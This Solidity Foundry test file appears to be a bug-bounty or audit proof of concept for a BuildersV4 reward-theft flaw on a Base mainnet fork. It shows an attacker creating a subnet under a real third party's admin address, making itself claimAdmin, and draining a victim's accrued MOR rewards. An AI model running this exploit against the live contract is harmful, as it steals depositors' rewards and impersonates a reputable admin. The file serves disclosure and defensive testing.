// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./MorpheusFork.t.sol";

/// @notice H-BLD-01 — Permissionless `createSubnet` lets an unprivileged
///         attacker self-appoint `claimAdmin` under a victim's `admin` name,
///         and `claimAdmin` alone can direct the whole subnet's pending
///         rewards to any address.
/// @dev Fork: Base mainnet, pinned block 56101591.
///      BuildersV4 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9 (proxy, impl
///      0x18faef315b40a6d9cf49628f1133b1aa507513b0, Sourcify exact_match).
///      Grounding: bytecode-inferred from the verified ABI + live traces
///      (ANALYZE §1.4–§1.5). No repo source is used as a stand-in for V4.
///
///      Mechanism under test:
///      1. `createSubnet` has NO sender binding on `admin` or `claimAdmin`:
///         any unprivileged caller can create a subnet naming an unrelated
///         reputable address as `admin` while appointing itself `claimAdmin`.
///         (Creation is free: subnetCreationFeeAmount = 0, creation op fee = 0.)
///      2. Victims deposit MOR into that subnet (the test demonstrates what
///         happens GIVEN a deposit into a subnet whose displayed `admin` the
///         victim trusted; it does NOT invent a mechanism that draws the
///         deposit — the attraction precondition is stated as conditional).
///      3. Rewards accrue to the subnet pro-rata to its share of total
///         staked, at RewardPool-3 emission (~2,859 MOR/day system-wide).
///      4. The attacker, as `claimAdmin`, calls `claim(subnetId, attacker)`:
///         the call pays the subnet's ENTIRE current pending rewards to the
///         attacker-chosen receiver, fee 0, no per-staker split.
///      5. The victim's staked principal is untouched by the claim.
///
///      The victim `admin` (the live "DRM3 Labs Corp." admin
///      0xC647d4080549603F8C779b9Dd28E53C62300aeA2, taken from ANALYZE §1.3)
///      NEVER signs or sends anything in this test: no `vm.prank` as that
///      address, no signature from it, no call from it anywhere. It is a
///      passive bystander whose address is merely named in the struct.
///      Likewise no `vm.prank` as owner / multisig / any privileged role.
contract HBLD01Test is MorpheusForkTest {
    // Live "DRM3 Labs Corp." subnet admin (ANALYZE §1.3) — a reputable
    // third-party address that never acts in this test.
    address internal constant VICTIM_ADMIN = 0xC647d4080549603F8C779b9Dd28E53C62300aeA2;

    string internal constant SUBNET_NAME = "Morpheus Builders PoC Subnet HBLD01";

    uint256 internal constant VICTIM_DEPOSIT = 100_000 ether; // MOR
    uint256 internal constant ELAPSED = 7 days;

    function setUp() public {
        setUpFork();
    }

    function testAttackerSelfAppointsClaimAdminAndClaimsVictimRewards() public {
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 10 ether);

        // --- Baseline: system-wide pending and Treasury balance at the pin.
        uint256 totalPendingBefore = IBuildersV4(BUILDERS_V4).getCurrentSubnetsRewards();
        uint256 treasuryBefore = MOR_TOKEN.balanceOf(BUILDERS_TREASURY);
        emit log_named_uint("system-wide pending MOR at pin", totalPendingBefore);
        emit log_named_uint("Treasury MOR balance at pin", treasuryBefore);
        assertGt(treasuryBefore, 0, "treasury must hold MOR to pay claims");

        // --- Steps 1–2: attacker creates the subnet; victim deposits.
        bytes32 subnetId = _createSubnet();
        _victimDeposit(subnetId);

        // --- Step 3: advance 7 days so rewards accrue to the subnet.
        vm.warp(block.timestamp + ELAPSED);
        uint256 pendingBeforeClaim = IBuildersV4(BUILDERS_V4).getCurrentSubnetRewards(subnetId);
        emit log_named_uint("subnet pending MOR after 7 days", pendingBeforeClaim);
        assertGt(pendingBeforeClaim, 0, "subnet must have accrued pending rewards");

        // Pro-rata expectation (sanity bound, not the assertion):
        // share = 100,000 / (2,946,079.67 + 100,000) ~= 3.283%;
        // 7 days x ~2,859.21 MOR/day x 3.283% ~= 657 MOR.
        assertGe(pendingBeforeClaim, 100 ether, "pending implausibly small vs pro-rata bound");
        assertLe(pendingBeforeClaim, 2_000 ether, "pending implausibly large vs pro-rata bound");

        // --- Step 4: attacker (as claimAdmin) claims the whole pending to itself.
        uint256 attackerBefore = MOR_TOKEN.balanceOf(attacker);
        assertEq(attackerBefore, 0, "attacker starts with 0 MOR");
        vm.prank(attacker);
        IBuildersV4(BUILDERS_V4).claim(subnetId, attacker);
        uint256 attackerGain = MOR_TOKEN.balanceOf(attacker) - attackerBefore;
        emit log_named_uint("attacker MOR before claim", attackerBefore);
        emit log_named_uint("attacker MOR after claim", MOR_TOKEN.balanceOf(attacker));
        emit log_named_uint("attacker gain (MOR)", attackerGain);
        emit log_named_uint("pending read just before claim (MOR)", pendingBeforeClaim);

        // The claim must pay (approximately) the full pending read just
        // before the claim. Exact-equality is expected because the view and
        // the claim run at the same block.timestamp; a 0.01 MOR tolerance
        // absorbs any dust-scale rounding in the inlined split arithmetic.
        assertApproxEqAbs(attackerGain, pendingBeforeClaim, 0.01 ether, "attacker gain must equal subnet pending");
        assertGt(attackerGain, 0, "attacker must gain MOR");

        // Pending is now (approximately) drained from the subnet.
        uint256 pendingAfterClaim = IBuildersV4(BUILDERS_V4).getCurrentSubnetRewards(subnetId);
        emit log_named_uint("subnet pending MOR after claim", pendingAfterClaim);
        assertApproxEqAbs(pendingAfterClaim, 0, 0.01 ether, "subnet pending must be drained by the claim");

        // --- Step 5: victim principal is unchanged by the attacker's claim.
        _assertVictimPrincipalIntact(subnetId);

        // Victim can still withdraw their full principal afterwards
        // (lock expired: deposit + 7 days, plus 1 extra day for safety).
        vm.warp(block.timestamp + 1 days);
        vm.prank(victim);
        IBuildersV4(BUILDERS_V4).withdraw(subnetId, VICTIM_DEPOSIT);
        assertEq(MOR_TOKEN.balanceOf(victim), VICTIM_DEPOSIT, "victim must recover full principal on withdraw");
        emit log_named_uint("victim MOR after full withdraw", MOR_TOKEN.balanceOf(victim));

        // --- The victim admin never signed or sent anything: by
        // --- construction this test contains no vm.prank / vm.sign as
        // --- VICTIM_ADMIN, owner, or multisig anywhere.
    }

    /// @dev Step 1: unprivileged attacker creates the subnet, naming the
    ///      victim admin as `admin` and itself as `claimAdmin`. Returns the
    ///      subnet id (createSubnet returns nothing; id is derived from the
    ///      name via getSubnetId).
    function _createSubnet() internal returns (bytes32 subnetId) {
        subnetId = IBuildersV4(BUILDERS_V4).getSubnetId(SUBNET_NAME);
        IBuildersV4.Subnet memory subnet = IBuildersV4.Subnet({
            name: SUBNET_NAME,
            admin: VICTIM_ADMIN,
            unusedStorage1_V4Update: 86_400,
            withdrawLockPeriodAfterDeposit: 604_800, // 7 days
            unusedStorage2_V4Update: 0,
            minimalDeposit: 0.001 ether,
            claimAdmin: attacker
        });
        IBuildersV4.SubnetMetadata memory metadata = IBuildersV4.SubnetMetadata({
            slug: "hbld01-poc-subnet",
            description: "PoC subnet",
            website: "https://example.com",
            image: ""
        });
        vm.prank(attacker);
        IBuildersV4(BUILDERS_V4).createSubnet(subnet, metadata);

        assertTrue(subnetId != bytes32(0), "subnet id must be non-zero");
        (string memory storedName, address storedAdmin, , , , uint256 storedMinDeposit, address storedClaimAdmin) =
            IBuildersV4(BUILDERS_V4).subnets(subnetId);
        assertEq(storedName, SUBNET_NAME, "stored subnet name mismatch");
        assertEq(storedAdmin, VICTIM_ADMIN, "stored admin must be the victim admin");
        assertEq(storedClaimAdmin, attacker, "stored claimAdmin must be the attacker");
        assertEq(storedMinDeposit, 0.001 ether, "stored minimalDeposit mismatch");
        emit log_named_bytes32("subnet id", subnetId);
        emit log_named_address("subnet admin (victim, never acts)", storedAdmin);
        emit log_named_address("subnet claimAdmin (attacker)", storedClaimAdmin);
    }

    /// @dev Step 2: victim deposits 100,000 MOR into the attacker's subnet.
    function _victimDeposit(bytes32 subnetId) internal {
        fundMOR(victim, VICTIM_DEPOSIT);
        assertEq(MOR_TOKEN.balanceOf(victim), VICTIM_DEPOSIT, "victim funding mismatch");
        vm.startPrank(victim);
        MOR_TOKEN.approve(BUILDERS_V4, type(uint256).max);
        IBuildersV4(BUILDERS_V4).deposit(subnetId, VICTIM_DEPOSIT);
        vm.stopPrank();
        assertEq(MOR_TOKEN.balanceOf(victim), 0, "victim must have deposited all MOR");
        (, , uint256 deposited, ) = IBuildersV4(BUILDERS_V4).usersData(victim, subnetId);
        assertEq(deposited, VICTIM_DEPOSIT, "victim principal must be recorded");
        (, uint256 subnetDeposited, , , ) = IBuildersV4(BUILDERS_V4).subnetsData(subnetId);
        assertEq(subnetDeposited, VICTIM_DEPOSIT, "subnet deposited must equal victim deposit");
    }

    /// @dev Step 5 helper: victim's recorded principal is unchanged.
    function _assertVictimPrincipalIntact(bytes32 subnetId) internal view {
        (, , uint256 deposited, ) = IBuildersV4(BUILDERS_V4).usersData(victim, subnetId);
        assertEq(deposited, VICTIM_DEPOSIT, "victim principal must be unchanged by the claim");
    }

    /// @dev Control: a random address (neither admin nor claimAdmin) cannot
    ///      claim — the claim power is exactly the admin/claimAdmin set.
    function testRandomAddressCannotClaim() public {
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 10 ether);
        address randomCaller = address(0xBEEF);

        bytes32 subnetId = _createSubnet();
        _victimDeposit(subnetId);
        vm.warp(block.timestamp + ELAPSED);
        assertGt(IBuildersV4(BUILDERS_V4).getCurrentSubnetRewards(subnetId), 0, "pending must exist for control");

        vm.expectRevert("BU: invalid caller");
        vm.prank(randomCaller);
        IBuildersV4(BUILDERS_V4).claim(subnetId, randomCaller);
        emit log_string("random caller claim reverted BU: invalid caller");
    }
}

interface IBuildersV4 {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }

    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function claim(bytes32 subnetId_, address receiver_) external;
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
    function getCurrentSubnetsRewards() external view returns (uint256);
    function getSubnetId(string calldata subnetName_) external view returns (bytes32);
    function subnets(bytes32 subnetId)
        external
        view
        returns (
            string memory name,
            address admin,
            uint128 unusedStorage1_V4Update,
            uint128 withdrawLockPeriodAfterDeposit,
            uint128 unusedStorage2_V4Update,
            uint256 minimalDeposit,
            address claimAdmin
        );
    function subnetsData(bytes32 subnetId)
        external
        view
        returns (
            uint128 unusedStorage1_V4Update,
            uint256 deposited,
            uint256 unusedStorage2_V4Update,
            uint256 rate,
            uint256 pendingRewards
        );
    function usersData(address user, bytes32 subnetId)
        external
        view
        returns (uint128 lastDeposit, uint128 unusedStorage1_V4Update, uint256 deposited, uint256 unusedStorage2_V4Update);
}
